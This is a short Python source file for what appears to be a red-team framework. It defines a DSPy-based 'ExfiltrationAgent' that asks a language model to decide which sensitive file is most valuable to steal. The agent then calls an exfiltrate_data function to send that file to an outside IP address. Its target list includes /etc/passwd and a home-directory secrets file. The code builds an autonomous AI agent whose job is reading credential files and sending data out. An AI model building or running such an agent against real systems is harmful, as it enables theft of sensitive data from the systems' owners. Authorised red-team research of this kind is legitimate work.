import dspy
from .base import BaseRedAgent
from tools.interface import exfiltrate_data

class ExfilSignature(dspy.Signature):
    """Decide which data is sensitive and how to steal it."""
    file_list = dspy.InputField()
    priority_file = dspy.OutputField(desc="The most valuable file to steal")

class ExfiltrationAgent(BaseRedAgent):
    def __init__(self):
        super().__init__("EXFIL", "Steal sensitive data.")
        self.decider = dspy.ChainOfThought(ExfilSignature)

    def execute(self, session_id):
        # In a real scenario, we'd use the Collection Agent to get this list first
        dummy_files = ["/etc/passwd", "/home/user/secrets.txt"]
        
        target = self.decider(file_list=str(dummy_files))
        self.log(f"Exfiltrating {target.priority_file}...")
        
        exfiltrate_data(session_id, target.priority_file, "100.x.y.z")